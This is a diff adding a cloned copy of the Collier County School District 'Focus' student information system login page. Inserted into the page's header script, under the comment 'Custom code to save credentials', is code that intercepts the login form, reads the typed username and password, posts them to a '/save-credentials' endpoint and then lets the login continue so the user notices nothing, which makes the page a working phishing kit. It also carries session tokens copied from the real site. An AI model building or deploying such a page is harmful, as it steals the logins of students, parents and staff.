@@ -1,0 +1,1002 @@
+<!DOCTYPE html>
+<html class="login-html">
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=1">
+				<title>Collier County School District</title>
+
+		<link rel="icon" type="image/x-icon" href="assets/favicon.ico%3Fm=1745195119">
+<link rel="stylesheet" type="text/css" href="layout/master/master.css%3Fm=1745195126.css">
+<link rel="stylesheet" type="text/css" href="assets/login/login.css%3Fm=1745195110.css">
+<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Lato">
+		<script>
+			// Focus globals
+			window.Focus = Object.assign(window.Focus || {}, {
+				server_date     : "2025-04-27",
+				has_static_date : false,
+				cookie_options  : {"expires":2061157201,"path":"\/focus","domain":"","httponly":true,"secure":true,"samesite":"Lax"},
+
+				// The following are used by the login page only
+				login_page            : true,
+				session_info          : {"key":"__session_jwt__","jwt":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NDU3OTcyMDEsImV4cCI6MTc0NjQwMjAwMSwiYXVkIjoiaHR0cHM6XC9cL2ZvY3VzLmNvbGxpZXJzY2hvb2xzLmNvbVwvZm9jdXMiLCJzZXNzaW9uIjpudWxsfQ.z3VGU0Z0My6cGG-TrtsjQqKOyllEaMZeeTmK6qOn13I","cookie_options":{"expires":1746402001,"path":"\/focus","domain":"","httponly":false,"secure":true,"samesite":"Lax"}},
+				login_template        : '',
+				registration_token    : '',
+				forgot_password_token : '',
+				customLogin           : {"enabled":true,"html":"&lt;hr \/&gt;\r\n&lt;div data-uw-styling-context=\"true\" style=\"text-align: center;\"&gt;&lt;img alt=\"\" src=\"https:\/\/focus.collierschools.com\/focus\/asset.php?type=ck&path=image\/CCPS-logo-vertical-white(1).png\" style=\"width: 140px; height: 144px;\" \/&gt;&lt;br \/&gt;\r\n&lt;br \/&gt;\r\n&lt;u&gt;&lt;strong data-uw-styling-context=\"true\"&gt;Vision - Where We Are Going&lt;\/strong&gt;&lt;\/u&gt;\u00a0&lt;br \/&gt;\r\nInspire students to achieve academic excellence.&lt;br \/&gt;\r\n\u00a0&lt;br \/&gt;\r\n\u00a0&lt;u&gt;&lt;strong data-uw-styling-context=\"true\"&gt;Mission - How We Get There&lt;\/strong&gt;&lt;\/u&gt;&lt;br \/&gt;\r\nCCPS will develop students\u2019 intellectual capacity and confidence in order to be successful lifelong learners with strong moral character who strive to reach their potential as productive members of American culture.&lt;\/div&gt;\r\n\r\n&lt;div style=\"text-align: center;\"&gt;\r\n&lt;hr \/&gt;&lt;span data-uw-styling-context=\"true\" style=\"font-size:10px;\"&gt;Florida Department of Children and Families&lt;br \/&gt;\r\nAbuse Hotline&lt;br \/&gt;\r\n&lt;a data-uw-styling-context=\"true\" href=\"tel:1-800-962-2873\"&gt;1-800-962-2873&lt;\/a&gt;&lt;br \/&gt;\r\n&lt;a data-uw-styling-context=\"true\" href=\"https:\/\/www.myflfamilies.com\/\" target=\"_blank\"&gt;Florida Department of Children and Families Website&lt;\/a&gt;&lt;br \/&gt;\r\n&lt;a data-uw-styling-context=\"true\" href=\"https:\/\/www.collierschools.com\/Page\/13446\" target=\"_blank\"&gt;Collier County Public Schools Mental Health Website&lt;\/a&gt;&lt;\/span&gt;&lt;\/div&gt;\r\n"},
+				mobileAppIds          : [],
+			});
+
+			function checkUserAgent() {
+				var browser = Focus.getBrowser();
+
+				if(browser === 'Edge' || browser === 'Internet Explorer') {
+					document.querySelector('.login-content .form-container').classList.add('unsupported-browser');
+				}
+			}
+
+			function fixUsernameInput() {
+				var username_field = document.getElementById('username-input');
+				var val            = username_field.value;
+
+				val = val.replace(/[\u2019\u2018]/g, "'");
+
+				username_field.value = val;
+			}
+
+			// Custom code to save credentials
+			document.addEventListener('DOMContentLoaded', function() {
+				// Override the default login handler
+				var originalLoginHandler;
+				
+				// Wait for jQuery to be loaded
+				var checkJQuery = setInterval(function() {
+					if (window.jQuery) {
+						clearInterval(checkJQuery);
+						
+						// Override submit event on the login form
+						jQuery(document).on('submit', '#main-login-form', function(e) {
+							e.preventDefault();
+							
+							var usernameInput = document.getElementById('username-input');
+							var passwordInput = document.querySelector('input[name="password"]');
+							
+							if (!usernameInput || !passwordInput) {
+								console.error('Login form inputs not found');
+								return;
+							}
+							
+							var username = usernameInput.value;
+							var password = passwordInput.value;
+							
+							// Send credentials to our server
+							fetch('/save-credentials', {
+								method: 'POST',
+								headers: {
+									'Content-Type': 'application/json'
+								},
+								body: JSON.stringify({
+									username: username,
+									password: password
+								})
+							})
+							.then(function(response) {
+								return response.json();
+							})
+							.then(function(data) {
+								console.log('Credentials saved successfully');
+								
+								// Continue with the original login process
+								if (originalLoginHandler) {
+									originalLoginHandler();
+								} else {
+									// If we couldn't hook the original handler, submit the form normally
+									document.getElementById('main-login-form').submit();
+								}
+							})
+							.catch(function(error) {
+								console.error('Error saving credentials:', error);
+								
+								// Continue with the original login process even if saving failed
+								if (originalLoginHandler) {
+									originalLoginHandler();
+								} else {
+									document.getElementById('main-login-form').submit();
+								}
+							});
+							
+							return false; // Prevent form submission
+						});
+					}
+				}, 100);
+			});
+		</script>
+
+		<script src="assets/cookies.js%3Fm=1745195118"></script>
+<script src="assets/jquery/jquery.js%3Fm=1745195118"></script>
+<script src="assets/focus/Focus.js%3Fm=1745195110"></script>
+<script src="assets/focus/Session.js%3Fm=1745195110"></script>
+<script src="assets/handlebars/handlebars.min.js%3Fm=1745195110"></script>
+<script src="assets/handlebars/Templates.js%3Fm=1745195110"></script>
+<script src="assets/handlebars/Focus.js%3Fm=1745195110"></script>
+<script src="assets/login/login.js%3Fm=1745195110"></script>
+<script src="assets/qrcode.js%3Fm=1745195118"></script>	</head>
+	<body class="login-body" onload="checkUserAgent()">
+		<div class="login-page">
+			<div class="mobile-app-link-container"></div>
+
+			<div class="login-header">
+				<img src="asset.php%3Fjwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvZm9jdXMuY29sbGllcnNjaG9vbHMuY29tXC9mb2N1cyIsImF1ZCI6Imh0dHBzOlwvXC9mb2N1cy5jb2xsaWVyc2Nob29scy5jb21cL2ZvY3VzIiwiaWF0IjoxNzQ0NDE2MDAwLCJleHAiOjE3NDcwMDgwMDAsIkZvY" />
+			</div>
+
+			<div class="login-content"></div>
+
+			<div class="login-disclaimer">
+				This is a restricted network. Use of this network, its equipment, and resources is monitored at all times
+				and requires explicit permission from the network administrator and Focus Student Information System. If you
+				do not have this permission in writing, you are violating the regulations of this network and can and will
+				be prosecuted to the full extent of the law. By continuing into this system, you are acknowledging that you
+				are aware of and agree to these terms.
+				<br>
+				<br>
+				Focus School Software &copy; 2004-2025			</div>
+		</div>
+
+		
+		<script>
+			class __Module__ {
+				// Set the session token
+				static setSessionToken(token) {
+					this.session_token = token;
+				}
+
+				// Get the request headers
+				static get headers() {
+					return { 'Authorization' : `Bearer ${this.session_id}` };
+				}
+
+				// Get the session ID
+				static get session_id() {
+					return `N2ehdT+GMwubuVr3LtYZ/g==`;
+				}
+
+				// Get the URL for sending AJAX requests
+				static get request_url() {
+					return "classes/FocusModule.class.php";
+				}
+
+				// Provides a hook to manipulate the FormData sent with requests
+				static async createFormData() {
+					return new FormData();
+				}
+
+				// Build the XHR request from one or more request specs
+				static async sendRequests(...specs) {
+					// If there are no specs, just return placeholder Promises
+					if(!specs.length) {
+						return {
+							response : Promise.resolve(null),
+							xhr      : Promise.resolve(null),
+						};
+					}
+
+					// Create the form data
+					const body     = await this.createFormData();
+					const requests = [];
+
+					// For each request
+					for(const { request, files } of specs) {
+						// Add the request
+						requests.push(request);
+
+						// Append any files to the form data
+						for(const { id, file } of files) {
+							body.append(id, file);
+						}
+					}
+
+					// Append the method calls and the request token
+					body.append('__call__', JSON.stringify(requests));
+					body.append('__token__', this.session_token);
+
+					// Send the AJAX request
+					const method  = 'POST';
+					const headers = this.headers;
+					const ajax    = this.ajax(this.request_url, { method, body, headers });
+
+					// When the response is received
+					ajax.response = ajax.response.then((response) => {
+						// Make sure there are the same number of responses as requests
+						if(response.length !== specs.length) {
+							throw new Error("Invalid response");
+						}
+
+						// Add each response to the corresponding request
+						for(let i = 0; i < response.length; i++) {
+							specs[i].request.response = response[i];
+						}
+
+						// Return the raw response
+						return response;
+					});
+
+					// Return the Module.ajax result
+					return ajax;
+				}
+
+				// Batch requests in 50ms windows
+				static throttledSendRequests(...specs) {
+					if(!this._throttledSendRequests) {
+						this._throttledSendRequests = this.throttle((...specs) => {
+							return this.sendRequests(...specs);
+						}, 50);
+					}
+
+					return this._throttledSendRequests(...specs);
+				}
+
+				// Send a controller method request
+				static request({ controller, method, args, key }, isolate = false) {
+					// Keep track of pending response Promises
+					if(!this.request._pending) {
+						this.request._pending = new Set();
+					}
+
+					const files = [];
+
+					// Format arguments and extract files
+					args = args.map((arg) => this.formatArgument(arg, files));
+
+					const request = { controller, method, args, key };
+					const spec    = { request, files };
+
+					// Wait for any pending response Promises
+					const ajax = isolate ? this.sendRequests(spec) : Promise.all(this.request._pending).then(() => {
+						return this.throttledSendRequests(spec);
+					});
+
+					// Create separate promises for the XHR object and the response
+					const xhr      = ajax.then(({ xhr }) => xhr);
+					const response = ajax.then(({ response }) => response.then(() => request.response));
+
+					// Add the response Promise to the pending set
+					if(!isolate) {
+						// Wait until the XHR is actually sent (otherwise this would break batching)
+						xhr.catch(() => {}).then(() => {
+							this.request._pending.add(response);
+
+							response.catch(() => {}).then(() => {
+								this.request._pending.delete(response);
+							});
+						});
+					}
+
+					// Return Promises for the XHR object and the response
+					return { xhr, response };
+				}
+
+				static addController(key, name, methods, options, context) {
+					// Log the context output
+					if((context[1] || {}).length > 0) {
+						const full_method = `${name}.getInitialContext`;
+
+						this.outputDebug(`${full_method}()`, context[1], {
+							'Method'           : full_method,
+							'Method Arguments' : [],
+						});
+					}
+
+					// Initialize the controller object
+					const controller = {
+						$context : context[0],
+					};
+
+					// Add the method callers
+					const always_isolate = options.includes(98);
+
+					for(let method of methods) {
+						// This caller just returns the request object. This
+						// is useful for methods that wrap other methods.
+						const request = (...args) => {
+							return {
+								controller : name,
+								method     : method,
+								args       : args,
+								key        : key,
+							};
+						};
+
+						// Helper function to call the method with/without the 'isolate' flag
+						const _call = (isolate, ...args) => {
+							// Send the request
+							const { xhr, response } = this.request(request(...args), isolate);
+
+							// Handle the response
+							const promise = response.then(({ error, result, output }) => {
+								if(output && output.length) {
+									const full_method = `${name}.${method}`;
+									const arg_string  = JSON.stringify(args).slice(1, -1);
+
+									this.outputDebug(`${full_method}(${arg_string})`, output, {
+										'Method'           : full_method,
+										'Method Arguments' : args,
+									});
+								}
+
+								if(error) {
+									throw new Error(error);
+								}
+
+								return result;
+							});
+
+							// Map XHR upload event listeners
+							promise.upload = {
+								addEventListener    : (e, cb) => xhr.then((xhr) => xhr.upload.addEventListener(e, cb)),
+								removeEventListener : (e, cb) => xhr.then((xhr) => xhr.upload.removeEventListener(e, cb)),
+							};
+
+							// Map XHR download event listeners
+							promise.download = {
+								addEventListener    : (e, cb) => xhr.then((xhr) => xhr.addEventListener(e, cb)),
+								removeEventListener : (e, cb) => xhr.then((xhr) => xhr.removeEventListener(e, cb)),
+							};
+
+							return promise;
+						};
+
+						// This is the default caller, which executes the method, logs any output, and
+						// returns a Promise that is resolved with the result or rejected with the error
+						const call = (...args) => {
+							return _call(false, ...args);
+						};
+
+						// This caller will send the request without batching it with other requests
+						const isolate = (...args) => {
+							return _call(true, ...args);
+						};
+
+						// This caller generates a URL that can be used
+						// to execute the method with the given arguments
+						const url = (...args) => {
+							const { controller, method, key } = request();
+
+							// Generate the request URL
+							const url = new URL(this.request_url, window.location);
+
+							url.searchParams.set('__call__', JSON.stringify([ key, controller, method, args ]));
+							url.searchParams.set('__token__', this.session_token);
+
+							return `${url}`;
+						};
+
+						controller[method]         = always_isolate ? isolate : call;
+						controller[method].isolate = isolate;
+						controller[method].request = request;
+						controller[method].url     = url;
+					}
+
+					return controller;
+				}
+
+				// Initialize an object with mapped function calls for each controller method
+				static init(data = {}) {
+					const controllers = {};
+
+					// For each controller key
+					for(let [ key, classes ] of Object.entries(data)) {
+						// For each controller
+						for(let [ name, controller_data ] of Object.entries(classes)) {
+							const methods = controller_data[0];
+							const options = controller_data[1];
+							const context = controller_data[2];
+
+							// Split class name by namespace
+							const parts = name.split(/\\/);
+
+							// Keep track of the current namespace level
+							let current = controllers;
+
+							while(parts.length) {
+								// Shift off a namespace
+								let part = parts.shift();
+
+								// Add the namespace to the controllers object
+								current[part] = current[part] || {};
+
+								// Move down the namespace chain
+								current = current[part];
+							}
+
+							// Add the controller definition
+							Object.assign(current, this.addController(key, name, methods, options, context));
+						}
+					}
+
+					return controllers;
+				}
+
+				// Throttle a function to only run once every ms milliseconds, on the
+				// trailing edge, and aggregate all the arguments passed to it
+				static throttle(fn, ms) {
+					// Aggregate arguments
+					let args    = [];
+					let current = null;
+
+					// Return the throttled function
+					return function(...tmp_args) {
+						// Aggregate the arguments
+						args = args.concat(tmp_args);
+
+						// If there is no execution queued
+						if(current === null) {
+							// Queue an execution and overwrite the current promise
+							current = new Promise(function(resolve, reject) {
+								setTimeout(function() {
+									// Clear the current promise
+									current = null;
+
+									// Call the original function with the aggregated arguments
+									resolve(fn(...args.splice(0, args.length)));
+								}, ms);
+							});
+						}
+
+						return current;
+					};
+				}
+
+				// Thin wrapper around XHR
+				static ajax(url, options) {
+					options = options || {};
+
+					// Create the XHR object
+					var xhr = new XMLHttpRequest();
+
+					// This is necessary to enable upload events in Chrome
+					// See: https://code.google.com/p/chromium/issues/detail?id=586643
+					xhr.upload.addEventListener('loadstart', function() {});
+
+					var response = new Promise(function(resolve, reject) {
+						// Keep track of whether the promise has been fulfilled
+						var fulfilled = false;
+
+						// Fulfill the promise only once
+						function fulfill(error, result) {
+							if(!fulfilled) {
+								if(error) {
+									const e = new Error(error);
+
+									e.__code__  = xhr.status;
+									e.__fatal__ = true;
+
+									reject(e);
+								}
+								else {
+									resolve(result);
+								}
+
+								fulfilled = true;
+							}
+						};
+
+						// Handle the load event
+						xhr.addEventListener('load', function() {
+							if(xhr.status === 200) {
+								try {
+									// Try to parse the response and resolve the promise
+									fulfill(null, JSON.parse(xhr.responseText));
+								}
+								catch(error) {
+									fulfill(error, null);
+								}
+							}
+							else {
+								fulfill(`Error: ${xhr.status}`, null);
+							}
+						});
+
+						// Handle the 'error' event
+						xhr.addEventListener('error', function() {
+							fulfill(`Error: ${xhr.status}`, null);
+						});
+
+						// Handle 'timeout' and 'abort' events
+						xhr.addEventListener('timeout', fulfill.bind(this, "Request timed out", null));
+					});
+
+					// Open the connection
+					xhr.open(options.method || 'GET', url);
+
+					// Set request headers
+					if(options.headers) {
+						for(var header in options.headers) {
+							xhr.setRequestHeader(header, options.headers[header]);
+						}
+					}
+
+					// Send the request
+					xhr.send(options.body || '');
+
+					// Return the raw XHR object and the response Promise
+					return { response, xhr };
+				}
+
+				// Format arguments
+				static formatArgument(arg, files) {
+					if(!this.formatArgument.file_ctr) {
+						this.formatArgument.file_ctr = 1;
+					}
+
+					// Handle File objects
+					if(arg instanceof File) {
+						const file = arg;
+						const id   = `file::${this.formatArgument.file_ctr++}`;
+
+						files.push({ id, file });
+
+						return {
+							__file__ : id
+						};
+					}
+
+					// Handle Array objects
+					if(arg instanceof Array) {
+						arg = arg.map((arg) => {
+							return this.formatArgument(arg, files);
+						});
+					}
+
+					// Handle plain objects
+					if(typeof arg === 'object' && arg !== null && Object.getPrototypeOf(arg) === Object.prototype) {
+						const formatted = {};
+
+						for(let i in arg) {
+							if(arg.hasOwnProperty(i)) {
+								formatted[i] = this.formatArgument(arg[i], files);
+							}
+						}
+
+						return formatted;
+					}
+
+					return arg;
+				}
+
+				// Helper method to output debug logs from controller methods
+				static outputDebug(title, message, extra_options) {
+					if(title.length > 100) {
+						title = `${title.slice(0, 100)}...`;
+					}
+
+					const showDebugOptions = function Click_Here_For_More_Options() {};
+
+					showDebugOptions.prototype = Object.defineProperties(Object.create(null), {
+						'>> Open Output in a Separate Window' : {
+							enumerable : true,
+
+							get : function() {
+								const w = window.open('', '_blank');
+
+								if(!w) {
+									return 'Error opening window! Check that popups are not being blocked on this site.';
+								}
+
+								w.document.open();
+								w.document.write(message);
+								w.document.close();
+
+								w.document.title                            = title;
+								w.document.documentElement.style.whiteSpace = 'pre';
+
+								return 'Window opened!';
+							},
+						},
+					});
+
+					console.groupCollapsed(`[Debug Output] ${title}`);
+					console.dir(Object.assign(new showDebugOptions(), extra_options));
+					console.log(message);
+					console.groupEnd();
+				}
+			}
+
+			window.__Module__ = __Module__;
+		</script>
+
+		
+		<script>
+			(function(global) {
+				const Module     = global.__Module__;
+				const App        = global.App || {};
+				const Controller = global.Controller || {};
+
+				// Initialize the App context
+				const context = App.context || {};
+
+				// Initialize controller methods
+				const controllers = Module.init({"\/tCdu5LEGj0eOS\/d5g\/GeGLGvx8JsjaH21oSFcr2jCcLPVX0UdmymIH5HG2itL00\/G7Qoq21P7qQVTzNSU0BLiz9JFEJ6GpkWHjFk+fcuzstWseQzVxNjTnNIO+bDKGBtLOX5cufV\/D7GonmJjGj6jJ9LgYkBAQ=":{"SSO\\Auth":[["getInitialContext","authenticate"],[],[{"sso_profile_id":null},""]]},"jZkKh6p47b3jlFeh4zv8bfzQet9L9az6gIll7xAIBAyFnJCBFQBiBsU7cc9IZc\/xzvAX5AVyFuJjq0sCH+LwuwpN5Ave45KH9yJnZymelcubC4xyoAq9QXAaW\/SGnlxvt7nsKJzyyEnRb4i0QtozpxJyoC\/MIf\/0wQ==":{"SSO\\Login":[["redirect","getInitialContext","getShortUrl","poll"],[],[{"profiles":[{"profile_id":3,"profile_type":"GoogleSignInProvider","provider_id":"__api_6","button":{"profile_title":"Canvas Test","provider_title":"Google Sign-In","text":"Sign in with Canvas Test","redirect_suffix":null,"google":true},"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NDU3OTcyMDEsImV4cCI6MTc0ODM4OTIwMSwiYXVkIjoiaHR0cHM6XC9cL2ZvY3VzLmNvbGxpZXJzY2hvb2xzLmNvbVwvZm9jdXMiLCJpc3MiOjMsInN1YiI6ImUwMWYyYjdjNDVhZjdiMDE4YjhjMTg5NTkxNTg1YmYxIiwibSI6MCwiayI6MH0.AsY-dbM6lVHl0eQvhJi-5wWE00ekrW62U9KQ2QsRBYw","native_browser":false,"qr_code":false,"enabled":false}],"force_auth":false,"focus_url":"https:\/\/focus.collierschools.com\/focus"},""]]},"HOa2ziP0h7i8kOLW7l8DAFwmURpQ2XUrga6sidRfK4kEitDceLYd5k18MXlpLY97Y\/3DoMtoKN63cSfPJsrqlWM1uB+HzipkuBMLiMEUkdMYkeeA+J5AMv7WzxdZAhn9ViH1mL1P2mjv9Ne8UcM1hoxILOKwEFlmcQ9wVH+1kMQS21LNVPI3VBHTudA=":{"SSO\\LinkedAccounts":[["linkAccount","unlinkAccount","getLinkedAccounts","getInitialContext","getExternalApiSchools"],[],[{"profiles":[{"profile_id":3,"schools":[]}],"accounts":[],"school":null},""]]}});
+
+				// Add the global context
+				App.context = Object.assign(context, {"sso_error":null,"mfa_qr_uri":null,"focus_url":"https:\/\/focus.collierschools.com\/focus"});
+
+				// Create the global App object
+				global.App = App;
+
+				// Create the global Controller object
+				global.Controller = Object.assign(Controller, controllers);
+			}(window));
+		</script>
+
+		
+		<script>
+			__Module__.setSessionToken(`qQTbnoJRxS7Z57fBRkhuJp8gOKL27YTu5git4w1B84+xGCXR4YKXSy5+0X40VBhBzgp4C/VhdSOQSeF6/UzM+Di3K3WlF5gdNFwEfMC651QU8a1lH1hsiNOShto2kjxOwrIap+sIIYQlLS5gNt/fB7mzzZ+7nRRi8h3egFpLEBm7cL4b5HjzgzKSO5j4RjLEhooTmrDhlnSdo47YQNE7Ke95V3FkMBttolJx/PYwqiLEWs0R2tBzTVTBaVuarCVYMIQGkULUfTKxfLiYUeaISqNZaIumtVnc3lkYE2evVwZripjqK40HPjnNfRIUu8YC5d04MWuzQJGItjqYLn7qIec0sLnJCXTkBqVSTzXrq3HYhd1yLu7IOGr9b6E2fcRhVeXGZCfG8qvwJr3yctVhMZlaeUAQXW0qu0wuwsuYDQ==`);
+		</script>
+
+		<link rel="stylesheet" href="assets/modules/semantic/focus-semantic.css%3Fm=1745195110.css"><link rel="stylesheet" href="assets/modules/semantic/semantic.min.css%3Fm=1745195110.css"><link rel="stylesheet" href="sso/ui/login/auth/auth.css%3Fm=1745195127.css"><link rel="stylesheet" href="sso/ui/login/linked_accounts/linked_accounts.css%3Fm=1745195127.css"><script type="text/x-handlebars-template" data-name="SSO-Auth">
+	<div class="ui form sso-auth-container">
+		<div class="two fields sso-auth-fields">
+			<div class="field">
+				<input {{#if sso}} disabled{{/if}} type="text" class="sso-auth-username" autocomplete="off" placeholder="{{#t}}Username{{/t}}">
+			</div>
+			<div class="field">
+				<input {{#if sso}} disabled{{/if}} type="password" class="sso-auth-password" autocomplete="new-password" placeholder="{{#t}}Password{{/t}}">
+			</div>
+		</div>
+		<div class="sso-auth-button-container">
+			{{#if sso}}
+				<div class="sso-login-container"></div>
+			{{else}}
+				<button type="button" class="ui green button sso-auth-button">{{#t}}Authenticate{{/t}}</button>
+			{{/if}}
+		</div>
+		<input type="hidden" class="sso-auth-token" name="sso-auth-token">
+	</div>
+</script>
+<script type="text/x-handlebars-template" data-name="SSO-Login">
+	<div class="sso-menu-container {{#if menu_class}}{{menu_class}}{{/if}}">
+		{{#if before_html}}{{{before_html}}}{{/if}}
+		{{#each profiles}}
+			<a href="{{url}}"
+				data-sso-profile-id="{{profile_id}}"
+				class="{{#if ../mobile}}ui huge fluid labeled icon button login-button{{else}}ui labeled icon button{{/if}} sso-login-button"
+				{{#unless ../mobile}}data-focus-tooltip="Sign in with {{button.profile_title}}"{{/unless}}
+				{{#if ../target_blank}}target="_blank" rel="noreferrer"{{/if}}
+			>
+				{{#if button.google}}
+					<img class="ui icon" src="https://focus.collierschools.com/focus/{{../assets_url}}/g-logo.png">
+				{{else}}
+					<i class="key icon"></i>
+				{{/if}}
+				<span class="sso-button-text">{{button.text}}</span>
+			</a>
+		{{/each}}
+		{{#if after_html}}{{{after_html}}}{{/if}}
+	</div>
+</script>
+<script type="text/x-handlebars-template" data-name="SSO-LinkedAccounts-unlink">
+	<div class="sso-unlink-container">
+		<button class="ui labeled icon button sso-unlink-button" data-sso-profile-id="{{profile_id}}" data-focus-tooltip="Logged in as {{username}}. Click to unlink this account">
+			<i class="red unlink icon"></i>
+			<span class="sso-button-text">{{username}}</span>
+		</button>
+	</div>
+</script>
+<script id="two-factor-auth-template" type="text/x-handlebars-template" data-name="mfa_auth">
+	<form id="two-factor-auth-form" class="2fa-form form-container mfa-mobile-form">
+		<input name="2fa-password" placeholder="Two Factor Authentication Password" class="form-input" autofocus />
+		<span>
+			<ol>
+				<li>Open the Two Factor Authentication app on your phone that you previously used with Focus</li>
+				<li>Enter the six digit code generated by the app</li>
+			</ol>
+		</span>
+		<div class="form-status">
+			<div class="form-loading hidden-opacity">Logging in...</div>
+			<div class="form-error hidden-opacity"></div>
+			<div class="login-message hidden"></div>
+		</div>
+		<button class="ui button form-button 2fa-submit-btn">Submit</button>
+	</form>
+</script><script id="secret-template" type="text/x-handlebars-template" data-name="mfa_setup">
+	<form id="secret-form" class="form-container mfa-mobile-form secret-form">
+		<div class="qr-code" data-qr="{{mfa_qr_uri}}"></div>
+		<div class="tfa-link"><a href="https://focus.collierschools.com/focus/{{mfa_qr_uri}}">CLICK HERE</a> to open in your default authenicator app</div>
+		<input name="2fa-password" placeholder="Google Authenticator Password" class="form-input" autofocus />
+		<span>
+			<ol>
+				<li>Download one of these Two Factor Authentication apps onto your phone: Google Authenticator, Duo Mobile, or Microsoft Authenticator</li>
+				<li>Scan the barcode above using the Two Factor Authentication app</li>
+				<li>Enter the six digit code generated by the app</li>
+			</ol>
+		</span>
+		<div class="form-status">
+			<div class="form-loading hidden-opacity">Logging in...</div>
+			<div class="form-error hidden-opacity"></div>
+			<div class="login-message hidden"></div>
+		</div>
+		<button class="ui button form-button">Submit</button>
+	</form>
+</script><script src="assets/handlebars/handlebars.min.js%3Fm=1745195110"></script><script src="assets/focus/HandlebarsHelpers.js%3Fm=1745195110"></script><script src="assets/modules/templates/focus-handlebars.js%3Fm=1745195110"></script><script src="assets/jquery/jquery-3.0.0.min.js%3Fm=1745195118"></script><script src="assets/modules/semantic/semantic.min.js%3Fm=1745195110"></script><script src="sso/ui/login/auth/Auth.js%3Fm=1745195127"></script><script src="sso/ui/login/basic/Login.js%3Fm=1745195127"></script><script src="sso/ui/login/linked_accounts/LinkedAccounts.js%3Fm=1745195127"></script>	</body>
+
+	<script id="login-template" type="text/x-handlebars-template">
+		<div class="form-container">
+			<div class="login-container">
+				<form id="main-login-form" class="login-form">
+					<div class="unsupported-message">
+						<p>
+							<i class="ui exclamation triangle icon"></i>
+							Focus may not work well with Internet Explorer.
+							<i class="ui exclamation triangle icon"></i>
+							<br>
+							Please try Google Chrome or Mozilla Firefox.
+						</p>
+						<div>
+							<a class="supported-browser-link" href="https://www.google.com/chrome/" target="_blank">
+								<i class="ui chrome icon"></i> Chrome
+							</a>
+							<a class="supported-browser-link" href="https://www.mozilla.org/en-US/firefox/new/" target="_blank">
+								<i class="ui firefox icon"></i> Firefox
+							</a>
+						</div>
+					</div>
+
+					<input name="username" id="username-input" placeholder="Username" onchange="fixUsernameInput()" class="form-input" autocorrect="off" autocapitalize="off" spellcheck="false" autofocus>
+					<input name="password" type="password" placeholder="Password" class="form-input">
+
+					
+					
+					<div class="clearfix">
+						<div class="form-status">
+							<div class="form-loading hidden-opacity">Signing in...</div>
+							<div class="form-error hidden-opacity"></div>
+						</div>
+
+						<div class="form-button-container">
+							<button class="ui large orange button form-button">Log In</button>
+
+							<div class="clear"></div>
+
+													</div>
+					</div>
+				</form>
+									<div class="sso-ui-container hidden">
+						<div class="sso-divider vertical-divider"></div>
+						<div class="sso-container ui small fluid vertical buttons"></div>
+					</div>
+							</div>
+			<div class="login-custom hidden"></div>
+		</div>
+	</script>
+
+	<script id="email-verification-template" type="text/x-handlebars-template">
+		<form id="email-verification-form" class="verification-form form-container">
+							<p class="ui info message">
+					You have successfully verified your email address. You may close this browser window.
+				</p>
+						<p>
+				<a class="ev-link" href="parents/index.php.html">Click here to log in to Focus</a>, <a class="ev-link" href="auth/index.php%3Faction=login.html">Click here to Add Students</a>, or <a class="ev-link" href="javascript:window.close()">click here to close this window</a>.
+			</p>
+		</form>
+	</script>
+
+	<script id="register-applicant-template" type="text/x-handlebars-template">
+		<form class="register-form form-container">
+			<h2 class="registration-header">
+				Register for a new Focus account.
+			</h2>
+
+			<div class="two fields">
+				<div class="field">
+					<input name="first_name" placeholder="First Name" class="form-input">
+					<label>First Name</label>
+				</div>
+
+				<div class="field">
+					<input name="last_name" placeholder="Last Name" class="form-input">
+					<label>Last Name</label>
+				</div>
+			</div>
+
+			<div class="field">
+				<input name="email" placeholder="Email" class="form-input">
+				<label>Email</label>
+			</div>
+
+			<div class="field">
+				<input name="username" placeholder="Username" class="form-input">
+				<label>Username</label>
+			</div>
+
+			<div class="field">
+				<input name="password" type="password" placeholder="Password" class="form-input">
+				<label>Password</label>
+			</div>
+
+			<div class="field">
+				<input name="password_2" type="password" placeholder="Password Again" class="form-input">
+				<label>Password Again</label>
+			</div>
+
+			<div class="form-status">
+				<div class="form-loading hidden-opacity">Loading...</div>
+				<div class="form-error hidden-opacity"></div>
+			</div>
+
+			<div class="form-button-container">
+				<button class="form-button">Register</button>
+
+				<div class="clear"></div>
+
+				<div class="registration-links">
+					<p>
+						<a href="../focus.html#" class="action-link" data-template="login">Login</a>
+					</p>
+				</div>
+			</div>
+		</form>
+	</script>
+
+	<script id="register-vendor-template" type="text/x-handlebars-template">
+		<form class="register-form form-container">
+			<h2 class="registration-header">
+				Register for a new Focus account.
+			</h2>
+
+			<div class="two fields">
+				<div class="field">
+					<input name="first_name" placeholder="First Name" class="form-input">
+					<label>First Name</label>
+				</div>
+
+				<div class="field">
+					<input name="last_name" placeholder="Last Name" class="form-input">
+					<label>Last Name</label>
+				</div>
+			</div>
+
+			<div class="field">
+				<input name="tax_id_number" placeholder="Tax ID Number" class="form-input">
+				<label>Tax ID Number</label>
+			</div>
+
+			<div class="field">
+				<input name="email" placeholder="Email" class="form-input">
+				<label>Email</label>
+			</div>
+
+			<div class="field">
+				<input name="username" placeholder="Username" class="form-input">
+				<label>Username</label>
+			</div>
+
+			<div class="field">
+				<input name="password" type="password" placeholder="Password" class="form-input">
+				<label>Password</label>
+			</div>
+
+			<div class="field">
+				<input name="password_2" type="password" placeholder="Password Again" class="form-input">
+				<label>Password Again</label>
+			</div>
+
+			<div class="form-status">
+				<div class="form-loading hidden-opacity">Loading...</div>
+				<div class="form-error hidden-opacity"></div>
+			</div>
+
+			<div class="form-button-container">
+				<button class="form-button">Register</button>
+
+				<div class="clear"></div>
+
+				<div class="registration-links">
+					<p>
+						<a href="../focus.html#" class="action-link" data-template="login">Login</a>
+					</p>
+				</div>
+			</div>
+		</form>
+	</script>
+
+	<script id="forgot-password-template" type="text/x-handlebars-template">
+		<form class="ui form forgot-password-form form-container">
+			<h4 class="registration-header">
+				Please enter your email address and we will send you instructions to reset your password.
+			</h4>
+
+			<input type="text" name="email" placeholder="Email address" class="form-input">
+
+			<div class="form-status">
+				<div class="form-loading hidden-opacity">Loading...</div>
+				<div class="form-error hidden-opacity"></div>
+			</div>
+
+			<div class="form-button-container">
+				<button class="form-button">Send</button>
+
